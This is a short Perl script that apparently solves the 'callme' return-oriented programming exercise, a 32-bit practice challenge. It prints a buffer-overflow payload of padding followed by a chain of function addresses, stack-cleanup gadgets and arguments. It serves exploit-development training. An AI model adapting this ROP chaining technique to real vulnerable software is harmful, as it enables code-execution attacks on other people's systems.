$PADDING="B"x44;
$CLEANUP="\xa9\x88\x04\x08"; # gadget pop;pop;pop;ret (cleanup stack)
$CALLME1="\xc6\x85\x04\x08"; # pxw @ reloc.callme_one
$CALLME2="\x26\x86\x04\x08"; # pxw @ reloc.callme_two
$CALLME3="\xb6\x85\x04\x08"; # pxw @ reloc.callme_three
$PARAMS="\1"."\0"x3 . "\2"."\0"x3 . "\3"."\0"x3;

print $PADDING
    . $CALLME1 . $CLEANUP . $PARAMS
    . $CALLME2 . $CLEANUP . $PARAMS
    . $CALLME3 . $CLEANUP . $PARAMS
;
